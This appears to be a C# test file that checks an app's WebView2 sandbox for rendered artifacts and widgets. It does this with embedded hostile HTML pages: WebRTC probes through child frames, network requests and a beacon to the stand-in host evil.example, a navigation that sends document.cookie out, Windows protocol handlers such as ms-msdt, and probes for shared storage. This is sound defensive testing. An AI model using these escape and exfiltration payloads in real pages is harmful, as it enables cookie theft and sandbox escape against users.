using System.Text.Json.Nodes;
using Marrow.App.Tests.Fixtures;

namespace Marrow.App.Tests.Window.Native;

// W26 sandbox-escape suite, the native part (DESIGN 13.4; docs/security/web-surfaces-threat-model.md; ED-NEW-web-w26-2, -8).
// Write but NEVER run as an implementing agent: the lead takes native.lock and schedules each Fact alone. Hostile pages in a
// real WebView2, as artifacts and as an inline widget. WebRTC is gone from the page, from a child frame reached through
// window[0], window.peer, its load handler and a script inserted in the same fragment, and from a sandboxed srcdoc frame
// (opaque origin); window.open, prefetch hints, fetch, EventSource, a WebSocket, an image, a font, a worker, a data: script,
// import() of a data URL, a <base> swap, a service worker, a shared worker, sendBeacon, fullscreen and pointer lock, the local network and
// another sandbox's site all fail; the page's own navigations away (a web address and Windows protocols) are cancelled and
// it stays on its own site. Two artifacts from two chats share no storage, cookie, IndexedDB or BroadcastChannel. A
// "fragment" failure means the residual in the threat model (a script running inside the very insertion that adds a
// frame) is real on this runtime and needs the engine-level fix listed there. One renderer process per artifact is
// checked by hand (the threat model's native list).
[Collection("WindowManagerNative")]
[Trait("Decision", "ED-NEW-web-w26-8")]
public sealed class SandboxEscapeNativeTests(WindowManagerNativeSession native)
{
    private const string Hostile = """
        <!doctype html><html><head><meta charset="utf-8"><title>escape</title>
        <link rel="preconnect" href="https://evil.example"><link rel="dns-prefetch" href="https://evil.example"><link rel="prefetch" href="https://evil.example/p">
        </head><body><script>
        (() => {
          const r = { top: typeof RTCPeerConnection, open: String(window.open('https://evil.example/')), media: typeof navigator.mediaDevices, frames: {}, net: {} };
          const rtc = (w) => { try { return typeof w.RTCPeerConnection; } catch (e) { return 'unreachable'; } };
          const add = (name) => { const f = document.createElement('iframe'); if (name) f.name = name; document.body.appendChild(f); return f; };
          add(); r.frames.indexed = rtc(window[0]);
          add('peer'); r.frames.named = rtc(window.peer);
          const loaded = document.createElement('iframe');
          loaded.onload = () => { r.frames.onload = rtc(window[2]); };
          document.body.appendChild(loaded);
          document.body.appendChild(document.createRange().createContextualFragment('<iframe></iframe><script>window.nthFragment = typeof window[3].RTCPeerConnection;<\/script>'));
          r.frames.fragment = String(window.nthFragment);
          addEventListener('message', (e) => { if (e.data && e.data.nthEscape) r.frames.sandboxed = e.data.rtc; });
          const box = document.createElement('iframe');
          box.setAttribute('sandbox', 'allow-scripts');
          box.srcdoc = '<script>parent.postMessage({ nthEscape: 1, rtc: typeof RTCPeerConnection }, "*");<\/script>';
          document.body.appendChild(box);
          const probe = (name, start) => {
            r.net[name] = 'pending';
            try { start().then(() => { r.net[name] = 'reached'; }, () => { r.net[name] = 'blocked'; }); } catch (e) { r.net[name] = 'blocked'; }
          };
          const event = (make) => () => new Promise((ok, no) => { const t = make(); t.onload = ok; t.onopen = ok; t.onmessage = ok; t.onerror = no; });
          probe('fetch', () => fetch('https://evil.example/c?d=1', { mode: 'no-cors' }));
          probe('local', () => fetch('http://127.0.0.1:9/', { mode: 'no-cors' }));
          probe('sandbox', () => fetch('https://w-other.invalid/', { mode: 'no-cors' }));
          probe('events', event(() => new EventSource('https://evil.example/stream')));
          probe('socket', event(() => new WebSocket('wss://evil.example/')));
          probe('image', event(() => { const i = new Image(); i.src = 'https://evil.example/p.png'; return i; }));
          probe('font', () => new FontFace('nth-escape', 'url(https://evil.example/f.woff2)').load());
          probe('worker', event(() => new Worker('https://evil.example/w.js')));
          probe('sharedWorker', () => new Promise((ok, no) => { const s = new SharedWorker('data:text/javascript,onconnect=(e)=>e.ports[0].postMessage(1)'); s.port.onmessage = ok; s.onerror = no; }));
          probe('serviceWorker', () => navigator.serviceWorker ? navigator.serviceWorker.register('/sw.js') : Promise.reject(new Error('none')));
          probe('dataImport', () => import('data:text/javascript,export default 1'));
          probe('fullscreen', () => document.documentElement.requestFullscreen());
          probe('pointerLock', () => Promise.resolve(document.body.requestPointerLock()).then(() => document.pointerLockElement ? 1 : Promise.reject(new Error('no lock'))));
          const data = document.createElement('script'); data.src = 'data:text/javascript,window.nthData=1'; document.head.appendChild(data);
          const base = document.createElement('base'); base.href = 'https://evil.example/'; document.head.appendChild(base);
          r.base = document.baseURI;
          r.beacon = String(navigator.sendBeacon('https://evil.example/b', 'x'));
          try { new RTCPeerConnection(); r.made = 'made'; } catch (e) { r.made = e.name; }
          setTimeout(() => { r.hints = document.querySelectorAll('link[rel]').length; r.dataScript = String(window.nthData); }, 500);
          ['ms-settings:privacy', 'search-ms:query=secret', 'ms-msdt:/id', 'https://evil.example/?d=' + encodeURIComponent(document.cookie)]
            .forEach((url, i) => setTimeout(() => { location.href = url; }, 200 + i * 150));
          setTimeout(() => { document.title = 'nth-escape:' + JSON.stringify(r); }, 3500);
        })();
        </script></body></html>
        """;

    private const string Writer = """
        <!doctype html><html><head><meta charset="utf-8"><title>writer</title></head><body><script>
        localStorage.setItem('nth-escape', 'secret'); sessionStorage.setItem('nth-escape', 'secret'); document.cookie = 'nth-escape=secret; SameSite=None; Secure';
        indexedDB.open('nth-escape', 1);
        const channel = new BroadcastChannel('nth-escape');
        const timer = setInterval(() => channel.postMessage('secret'), 100);
        setTimeout(() => { clearInterval(timer); document.title = 'nth-escape:{"wrote":true}'; }, 4000);
        </script></body></html>
        """;

    private const string Reader = """
        <!doctype html><html><head><meta charset="utf-8"><title>reader</title></head><body><script>
        (async () => {
          const r = { heard: 0 };
          new BroadcastChannel('nth-escape').onmessage = () => { r.heard++; };
          await new Promise((ok) => setTimeout(ok, 2500));
          r.local = String(localStorage.getItem('nth-escape'));
          r.session = String(sessionStorage.getItem('nth-escape'));
          r.cookie = document.cookie;
          r.databases = (await indexedDB.databases()).map((d) => d.name).join(',');
          document.title = 'nth-escape:' + JSON.stringify(r);
        })();
        </script></body></html>
        """;

    [Fact]
    public void A_hostile_artifact_reaches_nothing_on_the_real_engine() => native.Run(_ => Escape("artifact"), factType: typeof(SandboxEscapeNativeTests));

    [Fact]
    public void A_hostile_inline_widget_reaches_nothing_on_the_real_engine() => native.Run(_ => Escape("widget"), factType: typeof(SandboxEscapeNativeTests));

    [Fact]
    public void Two_artifacts_from_two_chats_share_no_storage_cookie_database_or_channel() => native.Run(_ =>
    {
        var rig = native.OnUi(() => new SandboxEscapeNativeRig(native, "artifact", Writer, Reader));
        try
        {
            WindowManagerNativeMethods.Until(() => native.OnUi(() => rig.Report(1)) is not null, "The reading artifact never reported.", 30000);
            var report = JsonNode.Parse(native.OnUi(() => rig.Report(1))!)!.AsObject();
            Assert.NotEqual(native.OnUi(() => rig.Addresses[0]), native.OnUi(() => rig.Addresses[1]));
            Assert.Equal(0, report["heard"]!.GetValue<int>());
            Assert.Equal("null", report["local"]!.GetValue<string>());
            Assert.Equal("null", report["session"]!.GetValue<string>());
            Assert.Equal("", report["cookie"]!.GetValue<string>());
            Assert.DoesNotContain("nth-escape", report["databases"]!.GetValue<string>(), StringComparison.Ordinal);
        }
        finally
        {
            native.OnUi(rig.Dispose);
        }
    }, factType: typeof(SandboxEscapeNativeTests));

    private void Escape(string surface)
    {
        var rig = native.OnUi(() => new SandboxEscapeNativeRig(native, surface, Hostile));
        try
        {
            WindowManagerNativeMethods.Until(() => native.OnUi(() => rig.Report(0)) is not null, "The hostile page never reported.", 30000);
            var report = JsonNode.Parse(native.OnUi(() => rig.Report(0))!)!.AsObject();
            var frames = report["frames"]!.AsObject();
            Assert.Equal("undefined", report["top"]!.GetValue<string>());
            Assert.Equal("null", report["open"]!.GetValue<string>());
            Assert.Equal("undefined", report["media"]!.GetValue<string>());
            Assert.NotEqual("made", report["made"]!.GetValue<string>());
            foreach (var frame in new[] { "indexed", "named", "onload", "fragment" })
                Assert.True(frames[frame]?.GetValue<string>() == "undefined", $"{surface}: the {frame} frame kept WebRTC ({frames[frame]})");
            Assert.NotEqual("function", frames["sandboxed"]?.GetValue<string>());
            foreach (var (name, outcome) in report["net"]!.AsObject())
                Assert.True(outcome!.GetValue<string>() != "reached", $"{surface}: {name} got through");
            Assert.Equal("false", report["beacon"]!.GetValue<string>());
            Assert.Equal(0, report["hints"]!.GetValue<int>());
            Assert.Equal("undefined", report["dataScript"]!.GetValue<string>());
            var address = native.OnUi(() => rig.Addresses[0]);
            Assert.StartsWith(address, report["base"]!.GetValue<string>(), StringComparison.Ordinal);
            Assert.Contains(native.OnUi(() => rig.Blocked[0].ToArray()), url => url.StartsWith("https://evil.example/?d=", StringComparison.Ordinal));
            Assert.StartsWith(address, native.OnUi(() => rig.Views[0].Url) ?? "", StringComparison.Ordinal);
        }
        finally
        {
            native.OnUi(rig.Dispose);
        }
    }
}
